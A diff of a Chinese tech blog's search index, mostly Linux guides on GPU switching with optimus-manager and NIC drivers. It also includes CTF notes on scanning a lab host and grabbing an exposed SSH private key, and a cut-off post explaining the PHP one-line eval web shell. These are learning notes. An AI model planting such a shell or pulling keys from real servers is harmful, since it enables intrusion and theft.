+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">optimus-manager [参数]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可选参数：</span></span><br><span class="line">-h，--<span class="built_in">help</span> 			显示此帮助消息并退出</span><br><span class="line">-v，--version 		打印版本并退出</span><br><span class="line">--status 			打印optimus-manager的当前状态</span><br><span class="line">--print-mode 		打印当前桌面会话正在运行的GPU模式</span><br><span class="line">--print-next-mode 	打印下次登录会话时将使用的GPU模式</span><br><span class="line">--print-startup 	打印将在启动时使用的GPU模式</span><br><span class="line">--switch MODE 		将GPU模式设置为MODE。需要注销然后登录以应用更改。可选模式：intel，nvidia，hybrid，auto（自动检测您可能想要切换到的模式）</span><br><span class="line">--set-startup STARTUP_MODE 		将启动模式设置为STARTUP_MODE。可选模式：intel，nvidia，hybrid</span><br><span class="line">--temp-config  		PATH设置临时配置文件的路径，仅用于下次重新引导。对于测试电源开关配置而不会导致无法启动的安装很有用</span><br><span class="line">--no-confirm 		切换GPU时不要求确认并跳过所有警告</span><br><span class="line">--cleanup 			删除守护程序剩余的自动生成的配置文件</span><br></pre></td></tr></table></figure>
+<p>intel模式为省电模式，nvidia模式为游戏模式</p>
+<h2 id="使用图形界面配置"><a href="#使用图形界面配置" class="headerlink" title="使用图形界面配置"></a>使用图形界面配置</h2><p>通过<a href="https://github.com/Shatur95/optimus-manager-qt"><code>optimus-manager-qt</code></a>或gnome-sell扩展<a href="https://github.com/inzar98/optimus-manager-argos"><code>optimus-manager-argos</code></a>来使用图形化前端来进行切换</p>
+<p>图形化配置通过生成<code>/etc/share/optimus-manager.conf</code>文件并添加内容实现配置的，如果已经有该文件会直接覆盖修改</p>
+<h1 id="配置文件详解"><a href="#配置文件详解" class="headerlink" title="配置文件详解"></a>配置文件详解</h1><p>optimus-manager的配置文件：<code>/usr/share/optimus-manager.conf</code></p>
+<p><strong>如需自定义配置，将该文件复制一份到<code>/etc/optimus-manager/</code>目录下进行修改即可</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[optimus]</span><br><span class="line"></span><br><span class="line"># 此参数定义接通Nvidia卡电源的方法</span><br><span class="line"># 可能的值：</span><br><span class="line"># -nouveau：将nouveau模块加载到Nvidia卡上</span><br><span class="line"># -bbswitch：使用bbswitch模块关闭卡的电源（需要bbswitch依赖项）</span><br><span class="line"># -acpi_call：尝试各种ACPI方法调用来打开和关闭卡的电源（需要acpi_call依赖项）</span><br><span class="line"># -none：请勿将外部模块用于电源管理。对于某些笔记本电脑型号，最好将此选项与pci_power_control结合使用（请参见下文）。设置该选项后，您还可以使用脚本nvidia-enable.sh和nvidia-disable.sh执行自定义命令以进行电源管理</span><br><span class="line"></span><br><span class="line">switching&#x3D;bbswitch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 在Intel模式下启用PCI电源管理。此选项与acpi_call和bbswitch不兼容，因此在这些情况下将被忽略</span><br><span class="line"></span><br><span class="line">pci_power_control&#x3D;yes</span><br><span class="line"></span><br><span class="line"># 从PCI总线上卸下Nvidia卡。可以防止电源开关引起的死机。如果switching &#x3D; nouveau或switching &#x3D; bbswitch则被忽略</span><br><span class="line"></span><br><span class="line">pci_remove&#x3D;no</span><br><span class="line"></span><br><span class="line"># 在重新加载nvidia模块之前，请在PCI级别上重置Nvidia卡。在重新加载nvidia模块之前，请确保卡处于新状态。可能会解决一些切换问题</span><br><span class="line"># 可能的值:</span><br><span class="line"># -no:不执行任何重置</span><br><span class="line"># -function_level:执行轻度的“功能级别”重置</span><br><span class="line"># -hot_reset:对PCI桥接器执行“热重置”。注意：此方法直接与硬件混淆，使用前请阅读optimus-manager的在线文档。另外，即使pci_remove&#x3D;no，也会执行PCI移除操作</span><br><span class="line"></span><br><span class="line">pci_reset&#x3D;no</span><br><span class="line"></span><br><span class="line"># 切换GPU时自动注销当前的桌面会话。当前，以下DE &#x2F; WM支持此功能：KDE Plasma，GNOME，XFCE，Deepin，i3，Openbox，AwesomeWM，bspwm如果禁用此选项或使用其他桌面环境，则GPU切换仅在下一个图形显示时有效会话登录</span><br><span class="line"></span><br><span class="line">auto_logout &#x3D;yes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[intel]</span><br><span class="line"></span><br><span class="line"># 用于Intel GPU的驱动程序。</span><br><span class="line"># 可能的值:modesetting，intel</span><br><span class="line"># 要使用intel驱动程序，需要安装软件包“ xf86-video-intel”</span><br><span class="line"></span><br><span class="line">driver&#x3D;modesetting</span><br><span class="line"></span><br><span class="line"># 加速方法（对应于Xorg配置中的AccelMethod）。仅适用于intel驱动程序</span><br><span class="line"># 可能的值:sna,xna</span><br><span class="line"># 默认值（未指定任何选项）</span><br><span class="line">accel&#x3D;</span><br><span class="line"></span><br><span class="line"># 在Xorg配置中启用TearFree选项，仅适用于intel驱动程序</span><br><span class="line"># 可能的值:yes,no</span><br><span class="line"># 保留默认值（未指定任何选项）</span><br><span class="line">tearfree&#x3D;</span><br></pre></td></tr></table></figure>
+<p>参考:</p>
+<p><a href="https://blog.edward-p.xyz/2019/04/optimus-manager/">使用 optimus-manager 来管理显卡切换</a></p>
+<p>Optimus-Manager的<br><a href="https://github.com/Askannz/optimus-manager/blob/master/README.md">README</a><br><a href="https://github.com/Askannz/optimus-manager/wiki">Wiki</a><br><a href="https://github.com/Askannz/optimus-manager/wiki/A-guide--to-power-management-options">电源管理选项指南</a><br><a href="https://github.com/Askannz/optimus-manager/wiki/FAQ,-common-issues,-troubleshooting">常见问题，常见问题，故障排除</a></p>
+]]></content>
+      <categories>
+        <category>Arch</category>
+      </categories>
+      <tags>
+        <tag>Arch</tag>
+        <tag>Linux</tag>
+        <tag>显卡</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Arch插拔外接电源时自动设置屏幕亮度</title>
     <url>/posts/695f0723/</url>
     <content><![CDATA[<p>在 <code>/etc/acpi/handler.sh</code> 脚本中添加条件亮度的代码实现</p>
@@ -839,45 +883,6 @@
       </categories>
       <tags>
         <tag>Arch</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Arch独立显卡驱动安装</title>
-    <url>/posts/4578a678/</url>
-    <content><![CDATA[<p>  Linux到独立显卡分开源驱动和闭源驱动两种，开源驱动不能完全发挥独立显卡到性能，闭源驱动使用<code>bumblebee</code> 的 <code>optirun</code> 的兼容性不好。而 <code>optimus-manager</code> 可以设置开机默认使用 Intel 还是 Nvidia ，可以随时在这两者之间切换。</p>
-<a id="more"></a>
-<h1 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S virtualgl lib32-virtualgl lib32-primus primus</span><br></pre></td></tr></table></figure>
-<h1 id="安装闭源bumblebee版驱动"><a href="#安装闭源bumblebee版驱动" class="headerlink" title="安装闭源bumblebee版驱动"></a>安装闭源bumblebee版驱动</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># sudo mhwd -f -i pci video-hybrid-intel-nvidia-bumblebee</span><br><span class="line">sudo mhwd -f -i pci video-hybrid-intel-nvidia-390xx-bumblebee</span><br></pre></td></tr></table></figure>
-<h2 id="讲用户加入到bumblee组"><a href="#讲用户加入到bumblee组" class="headerlink" title="讲用户加入到bumblee组"></a>讲用户加入到bumblee组</h2><p>sudo gpasswd -a $USER bumblebee</p>
-<h2 id="设置bumblebeed开机自启"><a href="#设置bumblebeed开机自启" class="headerlink" title="设置bumblebeed开机自启"></a>设置bumblebeed开机自启</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable bumblebeed</span><br></pre></td></tr></table></figure>
-<p><strong>很多硬件厂商的BIOS驱动对Linux不友好，无法顺利加载ACPI模块，从而导致无法驱动独立显卡，这就需要修改grub启动文件使ACPI模块能正常工作</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;default&#x2F;grub</span><br><span class="line"></span><br><span class="line"># 在 GRUB_CMDLINE_LINUX_DEFAULT&#x3D;&quot;quiet acpi_osi&#x3D;! resume&#x3D;UUID&#x3D;2d6d6716-4886-49ff-a277-55ba5d9f19d8&quot; 中加入 acpi_osi&#x3D;’Windows 2009’ 或者 acpi_osi&#x3D;! acpi_osi&#x3D;Linux acpi_osi&#x3D;’Windows 2015’ pcie_port_pm&#x3D;off</span><br><span class="line"># acpi_osi&#x3D;’Windows 2009’的意思是告诉ACPI模块，我是‘Windows 7’，模拟Windows让其继续运行</span><br><span class="line"></span><br><span class="line"># 如：</span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT&#x3D;&quot;quiet acpi_osi&#x3D;! acpi_osi&#x3D;’Windows 2009’ resume&#x3D;UUID&#x3D;2d6d6716-4886-49ff-a277-55ba5d9f19d8&quot;</span><br></pre></td></tr></table></figure></p>
-<h2 id="更新grub文件，使永久有效"><a href="#更新grub文件，使永久有效" class="headerlink" title="更新grub文件，使永久有效"></a>更新grub文件，使永久有效</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo update-grub</span><br><span class="line"></span><br><span class="line">#重启</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
-<h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 安装性能测试软件</span><br><span class="line">sudo pacman -S mesa-demos</span><br><span class="line">sudo pacman -S glmark2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h1 id="测试集显性能"><a href="#测试集显性能" class="headerlink" title="测试集显性能"></a>测试集显性能</h1><p>glxgears<br>glmark2</p>
-<h1 id="测试独显性能"><a href="#测试独显性能" class="headerlink" title="测试独显性能"></a>测试独显性能</h1><p>optirun glxgears<br>optirun glmark2<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## NVIDIA setting面板打不开使用以下命令</span><br></pre></td></tr></table></figure><br>optirun -b none nvidia-settings -c :8<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"># 使用optimus-manager管理显卡</span><br><span class="line"></span><br><span class="line">[optimus-manager仓库](https:&#x2F;&#x2F;github.com&#x2F;Askannz&#x2F;optimus-manager)</span><br><span class="line"></span><br><span class="line">​&#96;&#96;&#96;bash</span><br><span class="line">sudo pacman -S optimus-manager</span><br></pre></td></tr></table></figure></p>
-<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>确保 <code>/etc/X11/xorg.conf</code> 和 <code>/etc/X11/xorg.conf.d</code> 下没有其他显卡和显示相关的配置，如果有的话可以备份后删掉,原因是 <code>optimus-manager</code> 会生成显卡配置文件 <code>/etc/X11/xorg.conf.d/10-optimus-manager.conf</code>,多个显卡配置文件可能导致出错</p>
-<p><strong>目录结构如下</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tree &#x2F;etc&#x2F;X11&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;X11&#x2F;</span><br><span class="line">├── xinit</span><br><span class="line">│   └── xinitrc.d</span><br><span class="line">│       ├── 40-libcanberra-gtk-module.sh</span><br><span class="line">│       └── 50-systemd-user.sh</span><br><span class="line">└── xorg.conf.d</span><br><span class="line">        └── 10-optimus-manager.conf</span><br></pre></td></tr></table></figure></p>
-<h2 id="关闭-bumblebeed"><a href="#关闭-bumblebeed" class="headerlink" title="关闭 bumblebeed"></a>关闭 bumblebeed</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl stop bumblebeed</span><br><span class="line">sudo systemctl <span class="built_in">disable</span> bumblebeed</span><br></pre></td></tr></table></figure>
-<h1 id="启动optimus-manager服务"><a href="#启动optimus-manager服务" class="headerlink" title="启动optimus-manager服务"></a>启动optimus-manager服务</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable optimus-manager</span><br></pre></td></tr></table></figure>
-<p><strong>重启</strong></p>
-<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 切换到nvidia</span><br><span class="line">optimus-manager --switch nvidia</span><br><span class="line"></span><br><span class="line"># 切换到Intel</span><br><span class="line">optimus-manager --switch intel</span><br><span class="line"></span><br><span class="line"># 设置开机使用intel</span><br><span class="line">optimus-manager --set-startup&#x3D;intel</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">optimus-manager [参数]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可选参数：</span></span><br><span class="line">-h，--<span class="built_in">help</span> 			显示此帮助消息并退出</span><br><span class="line">-v，--version 		打印版本并退出</span><br><span class="line">--status 			打印optimus-manager的当前状态</span><br><span class="line">--print-mode 		打印当前桌面会话正在运行的GPU模式</span><br><span class="line">--print-next-mode 	打印下次登录会话时将使用的GPU模式</span><br><span class="line">--print-startup 	打印将在启动时使用的GPU模式</span><br><span class="line">--switch MODE 		将GPU模式设置为MODE。需要注销然后登录以应用更改。可选模式：intel，nvidia，hybrid，auto（自动检测您可能想要切换到的模式）</span><br><span class="line">--set-startup STARTUP_MODE 		将启动模式设置为STARTUP_MODE。可选模式：intel，nvidia，hybrid</span><br><span class="line">--temp-config  		PATH设置临时配置文件的路径，仅用于下次重新引导。对于测试电源开关配置而不会导致无法启动的安装很有用</span><br><span class="line">--no-confirm 		切换GPU时不要求确认并跳过所有警告</span><br><span class="line">--cleanup 			删除守护程序剩余的自动生成的配置文件</span><br></pre></td></tr></table></figure>
-<p>intel模式为省电模式，nvidia模式为游戏模式</p>
-<h2 id="使用图形界面配置"><a href="#使用图形界面配置" class="headerlink" title="使用图形界面配置"></a>使用图形界面配置</h2><p>通过<a href="https://github.com/Shatur95/optimus-manager-qt"><code>optimus-manager-qt</code></a>或gnome-sell扩展<a href="https://github.com/inzar98/optimus-manager-argos"><code>optimus-manager-argos</code></a>来使用图形化前端来进行切换</p>
-<p>图形化配置通过生成<code>/etc/share/optimus-manager.conf</code>文件并添加内容实现配置的，如果已经有该文件会直接覆盖修改</p>
-<h1 id="配置文件详解"><a href="#配置文件详解" class="headerlink" title="配置文件详解"></a>配置文件详解</h1><p>optimus-manager的配置文件：<code>/usr/share/optimus-manager.conf</code></p>
-<p><strong>如需自定义配置，将该文件复制一份到<code>/etc/optimus-manager/</code>目录下进行修改即可</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[optimus]</span><br><span class="line"></span><br><span class="line"># 此参数定义接通Nvidia卡电源的方法</span><br><span class="line"># 可能的值：</span><br><span class="line"># -nouveau：将nouveau模块加载到Nvidia卡上</span><br><span class="line"># -bbswitch：使用bbswitch模块关闭卡的电源（需要bbswitch依赖项）</span><br><span class="line"># -acpi_call：尝试各种ACPI方法调用来打开和关闭卡的电源（需要acpi_call依赖项）</span><br><span class="line"># -none：请勿将外部模块用于电源管理。对于某些笔记本电脑型号，最好将此选项与pci_power_control结合使用（请参见下文）。设置该选项后，您还可以使用脚本nvidia-enable.sh和nvidia-disable.sh执行自定义命令以进行电源管理</span><br><span class="line"></span><br><span class="line">switching&#x3D;bbswitch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 在Intel模式下启用PCI电源管理。此选项与acpi_call和bbswitch不兼容，因此在这些情况下将被忽略</span><br><span class="line"></span><br><span class="line">pci_power_control&#x3D;yes</span><br><span class="line"></span><br><span class="line"># 从PCI总线上卸下Nvidia卡。可以防止电源开关引起的死机。如果switching &#x3D; nouveau或switching &#x3D; bbswitch则被忽略</span><br><span class="line"></span><br><span class="line">pci_remove&#x3D;no</span><br><span class="line"></span><br><span class="line"># 在重新加载nvidia模块之前，请在PCI级别上重置Nvidia卡。在重新加载nvidia模块之前，请确保卡处于新状态。可能会解决一些切换问题</span><br><span class="line"># 可能的值:</span><br><span class="line"># -no:不执行任何重置</span><br><span class="line"># -function_level:执行轻度的“功能级别”重置</span><br><span class="line"># -hot_reset:对PCI桥接器执行“热重置”。注意：此方法直接与硬件混淆，使用前请阅读optimus-manager的在线文档。另外，即使pci_remove&#x3D;no，也会执行PCI移除操作</span><br><span class="line"></span><br><span class="line">pci_reset&#x3D;no</span><br><span class="line"></span><br><span class="line"># 切换GPU时自动注销当前的桌面会话。当前，以下DE &#x2F; WM支持此功能：KDE Plasma，GNOME，XFCE，Deepin，i3，Openbox，AwesomeWM，bspwm如果禁用此选项或使用其他桌面环境，则GPU切换仅在下一个图形显示时有效会话登录</span><br><span class="line"></span><br><span class="line">auto_logout &#x3D;yes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[intel]</span><br><span class="line"></span><br><span class="line"># 用于Intel GPU的驱动程序。</span><br><span class="line"># 可能的值:modesetting，intel</span><br><span class="line"># 要使用intel驱动程序，需要安装软件包“ xf86-video-intel”</span><br><span class="line"></span><br><span class="line">driver&#x3D;modesetting</span><br><span class="line"></span><br><span class="line"># 加速方法（对应于Xorg配置中的AccelMethod）。仅适用于intel驱动程序</span><br><span class="line"># 可能的值:sna,xna</span><br><span class="line"># 默认值（未指定任何选项）</span><br><span class="line">accel&#x3D;</span><br><span class="line"></span><br><span class="line"># 在Xorg配置中启用TearFree选项，仅适用于intel驱动程序</span><br><span class="line"># 可能的值:yes,no</span><br><span class="line"># 保留默认值（未指定任何选项）</span><br><span class="line">tearfree&#x3D;</span><br></pre></td></tr></table></figure>
-<p>参考:<br><a href="https://blog.edward-p.xyz/2019/04/optimus-manager/">使用 optimus-manager 来管理显卡切换</a></p>
-<p>Optimus-Manager的<br><a href="https://github.com/Askannz/optimus-manager/blob/master/README.md">README</a><br><a href="https://github.com/Askannz/optimus-manager/wiki">Wiki</a><br><a href="https://github.com/Askannz/optimus-manager/wiki/A-guide--to-power-management-options">电源管理选项指南</a><br><a href="https://github.com/Askannz/optimus-manager/wiki/FAQ,-common-issues,-troubleshooting">常见问题，常见问题，故障排除</a></p>
-]]></content>
-      <categories>
-        <category>Arch</category>
-      </categories>
-      <tags>
-        <tag>Arch</tag>
-        <tag>Linux</tag>
-        <tag>显卡</tag>
       </tags>
   </entry>
   <entry>
@@ -1056,21 +1061,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CTF学习笔记</title>
-    <url>/posts/586ba39a/</url>
-    <content><![CDATA[<h1 id="CTF-学习笔记"><a href="#CTF-学习笔记" class="headerlink" title="CTF 学习笔记"></a>CTF 学习笔记</h1><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.0.0/24		<span class="comment">#扫描网段存活IP</span></span><br><span class="line">nmap -sV 192.168.0.0/24		<span class="comment">#扫描存活端口</span></span><br><span class="line"><span class="comment">#通过开放的可疑端口（将服务运行在非常规的端口上）访问，查看源代码看是否有有用信息</span></span><br><span class="line"></span><br><span class="line">dirb http://192.168.0.7:31337	<span class="comment">#探测隐藏文件</span></span><br><span class="line"><span class="comment">#探测出相关影藏文件后对可疑文件进行分析</span></span><br><span class="line"><span class="comment">#robots文件	记录禁止被探测的文件，通过该文件内容能找到一些重要文件</span></span><br><span class="line"><span class="comment">#.ssh文件		记录ssh秘钥信息，通常id_rsd代表私钥（可用来认证ssh登录），authorized_keys代表认证信息(能从中找用户名等信息))，id_rsa.pub代表公钥</span></span><br><span class="line"><span class="comment">#ssh是一钟远程加密登录协议，通常是用于远程管理计算机使用，ssh可通过口令登录，也可通过秘钥登录</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过.ssh文件猜猜存在秘钥文件</span></span><br><span class="line"><span class="comment">#获得秘钥文件</span></span><br><span class="line"><span class="comment">#http://192.168.0.7:31337/.ssh/id_rsa</span></span><br><span class="line"><span class="comment">#http://192.168.0.7:31337/.ssh/authorized_keys</span></span><br><span class="line"><span class="comment">#给私钥修改权限</span></span><br><span class="line">chmod 600 id_rsa</span><br><span class="line"><span class="comment">#破解私钥信息</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>安全</category>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>信息安全</tag>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CentOS无网卡配置文件解决方法</title>
     <url>/posts/13f6370e/</url>
     <content><![CDATA[<h1 id="网卡UUID"><a href="#网卡UUID" class="headerlink" title="网卡UUID"></a>网卡UUID</h1><p>查看相应网卡的UUID并记录</p>
@@ -1087,6 +1077,21 @@
       </categories>
       <tags>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTF学习笔记</title>
+    <url>/posts/586ba39a/</url>
+    <content><![CDATA[<h1 id="CTF-学习笔记"><a href="#CTF-学习笔记" class="headerlink" title="CTF 学习笔记"></a>CTF 学习笔记</h1><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.0.0/24		<span class="comment">#扫描网段存活IP</span></span><br><span class="line">nmap -sV 192.168.0.0/24		<span class="comment">#扫描存活端口</span></span><br><span class="line"><span class="comment">#通过开放的可疑端口（将服务运行在非常规的端口上）访问，查看源代码看是否有有用信息</span></span><br><span class="line"></span><br><span class="line">dirb http://192.168.0.7:31337	<span class="comment">#探测隐藏文件</span></span><br><span class="line"><span class="comment">#探测出相关影藏文件后对可疑文件进行分析</span></span><br><span class="line"><span class="comment">#robots文件	记录禁止被探测的文件，通过该文件内容能找到一些重要文件</span></span><br><span class="line"><span class="comment">#.ssh文件		记录ssh秘钥信息，通常id_rsd代表私钥（可用来认证ssh登录），authorized_keys代表认证信息(能从中找用户名等信息))，id_rsa.pub代表公钥</span></span><br><span class="line"><span class="comment">#ssh是一钟远程加密登录协议，通常是用于远程管理计算机使用，ssh可通过口令登录，也可通过秘钥登录</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过.ssh文件猜猜存在秘钥文件</span></span><br><span class="line"><span class="comment">#获得秘钥文件</span></span><br><span class="line"><span class="comment">#http://192.168.0.7:31337/.ssh/id_rsa</span></span><br><span class="line"><span class="comment">#http://192.168.0.7:31337/.ssh/authorized_keys</span></span><br><span class="line"><span class="comment">#给私钥修改权限</span></span><br><span class="line">chmod 600 id_rsa</span><br><span class="line"><span class="comment">#破解私钥信息</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>安全</category>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>信息安全</tag>
+        <tag>笔记</tag>
       </tags>
   </entry>
   <entry>
@@ -4699,6 +4704,30 @@ target 的默认值是&quot;pattern&quot;，表示此&lt;match&gt;单元针对�
       </tags>
   </entry>
   <entry>
+    <title>Manjaro有线网卡驱动</title>
+    <url>/posts/496f126/</url>
+    <content><![CDATA[<p>Manjaro有线网卡驱动可能会装成非对应的版本，造成无法使用以太网，需要卸载原有驱动安装对应的匹配驱动</p>
+<h1 id="查看并卸载原驱动"><a href="#查看并卸载原驱动" class="headerlink" title="查看并卸载原驱动"></a>查看并卸载原驱动</h1><p>使用 <code>lspci | grep net</code> 查询网卡设备信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➤ lspci | grep net</span><br><span class="line">04:00.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL8111&#x2F;8168&#x2F;8411 PCI Express Gigabit Ethernet Controller (rev 15)</span><br></pre></td></tr></table></figure>
+<p>使用 <code>lspci -k | grep -A 4 net</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➤ lspci -k | grep -A 4 net</span><br><span class="line">04:00.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL8111&#x2F;8168&#x2F;8411 PCI Express Gigabit Ethernet Controller (rev 15)</span><br><span class="line">	Subsystem: Acer Incorporated [ALI] Device 1133</span><br><span class="line">	Kernel driver in use: r8169</span><br><span class="line">	Kernel modules: r8169</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>查询原驱动文件的位置，删除或备份</p>
+<p>以 <code>r8169</code> 驱动为例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">modinfo r8169 |grep filename</span><br><span class="line"></span><br><span class="line"># 备份</span><br><span class="line">mv &#x2F;lib&#x2F;modules&#x2F;5.10.7-3-MANJARO&#x2F;kernel&#x2F;drivers&#x2F;net&#x2F;ethernet&#x2F;realtek&#x2F;r8169.ko.xz ~&#x2F;r8169.ko.xz.backup</span><br><span class="line"></span><br><span class="line"># 卸载</span><br><span class="line">rmmod r8169</span><br><span class="line"></span><br><span class="line"># 查询是否成功，若无结果则成功</span><br><span class="line">lsmod | grep r8169</span><br></pre></td></tr></table></figure>
+<h1 id="安装正确的驱动"><a href="#安装正确的驱动" class="headerlink" title="安装正确的驱动"></a>安装正确的驱动</h1><p>通过查询我的网卡是 <code>RTL8111/8168/8411</code> ，使用命令 <code>sudo pacman -Ss rxxxx</code> 搜索存在驱动 <code>r8168</code> ，选择相应内核版本的进行安装即可 (<code>sudo pacman -S linux510-r8168</code>)。</p>
+<p>尝试挂载 (<code>sudo modprobe r8168</code>) 或重启系统，重启后就能使用了。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://segmentfault.com/a/1190000037617931">Manjaro安装有线网卡驱动</a></p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Manjaro</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux独立显卡驱动安装</title>
     <url>/posts/4a637166/</url>
     <content><![CDATA[<p>  Linux到独立显卡分开源驱动和闭源驱动两种，开源驱动不能完全发挥独立显卡到性能，闭源驱动使用<code>bumblebee</code> 的 <code>optirun</code> 的兼容性不好。而 <code>optimus-manager</code> 可以设置开机默认使用 Intel 还是 Nvidia ，可以随时在这两者之间切换。</p>
@@ -4733,30 +4762,6 @@ target 的默认值是&quot;pattern&quot;，表示此&lt;match&gt;单元针对�
       </categories>
       <tags>
         <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Manjaro有线网卡驱动</title>
-    <url>/posts/496f126/</url>
-    <content><![CDATA[<p>Manjaro有线网卡驱动可能会装成非对应的版本，造成无法使用以太网，需要卸载原有驱动安装对应的匹配驱动</p>
-<h1 id="查看并卸载原驱动"><a href="#查看并卸载原驱动" class="headerlink" title="查看并卸载原驱动"></a>查看并卸载原驱动</h1><p>使用 <code>lspci | grep net</code> 查询网卡设备信息</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➤ lspci | grep net</span><br><span class="line">04:00.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL8111&#x2F;8168&#x2F;8411 PCI Express Gigabit Ethernet Controller (rev 15)</span><br></pre></td></tr></table></figure>
-<p>使用 <code>lspci -k | grep -A 4 net</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➤ lspci -k | grep -A 4 net</span><br><span class="line">04:00.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL8111&#x2F;8168&#x2F;8411 PCI Express Gigabit Ethernet Controller (rev 15)</span><br><span class="line">	Subsystem: Acer Incorporated [ALI] Device 1133</span><br><span class="line">	Kernel driver in use: r8169</span><br><span class="line">	Kernel modules: r8169</span><br></pre></td></tr></table></figure>
-<a id="more"></a>
-<p>查询原驱动文件的位置，删除或备份</p>
-<p>以 <code>r8169</code> 驱动为例：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">modinfo r8169 |grep filename</span><br><span class="line"></span><br><span class="line"># 备份</span><br><span class="line">mv &#x2F;lib&#x2F;modules&#x2F;5.10.7-3-MANJARO&#x2F;kernel&#x2F;drivers&#x2F;net&#x2F;ethernet&#x2F;realtek&#x2F;r8169.ko.xz ~&#x2F;r8169.ko.xz.backup</span><br><span class="line"></span><br><span class="line"># 卸载</span><br><span class="line">rmmod r8169</span><br><span class="line"></span><br><span class="line"># 查询是否成功，若无结果则成功</span><br><span class="line">lsmod | grep r8169</span><br></pre></td></tr></table></figure>
-<h1 id="安装正确的驱动"><a href="#安装正确的驱动" class="headerlink" title="安装正确的驱动"></a>安装正确的驱动</h1><p>通过查询我的网卡是 <code>RTL8111/8168/8411</code> ，使用命令 <code>sudo pacman -Ss rxxxx</code> 搜索存在驱动 <code>r8168</code> ，选择相应内核版本的进行安装即可 (<code>sudo pacman -S linux510-r8168</code>)。</p>
-<p>尝试挂载 (<code>sudo modprobe r8168</code>) 或重启系统，重启后就能使用了。</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://segmentfault.com/a/1190000037617931">Manjaro安装有线网卡驱动</a></p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>Manjaro</tag>
       </tags>
   </entry>
   <entry>
@@ -7377,6 +7382,54 @@ target 的默认值是&quot;pattern&quot;，表示此&lt;match&gt;单元针对�
       </tags>
   </entry>
   <entry>
+    <title>PHP一句话</title>
+    <url>/posts/77b49f04/</url>
+    <content><![CDATA[<h1 id="一句话木马原理"><a href="#一句话木马原理" class="headerlink" title="一句话木马原理"></a>一句话木马原理</h1><p><code>&lt;?php @eval($_POST[&#39;hack&#39;]);?&gt;</code> 是一句话后面中最经典的一种，，其原理是：通过 <code>POST</code> 、<code>GET</code> 、<code>COOKIE</code> 三种方式获取参数 <code>hack</code> 的值，通过 <code>eval()</code> 函数执行 <code>hack</code> 中的PHP代码，这样就能通过一句话木马在网站执行传递过去的任意PHP语句。</p>
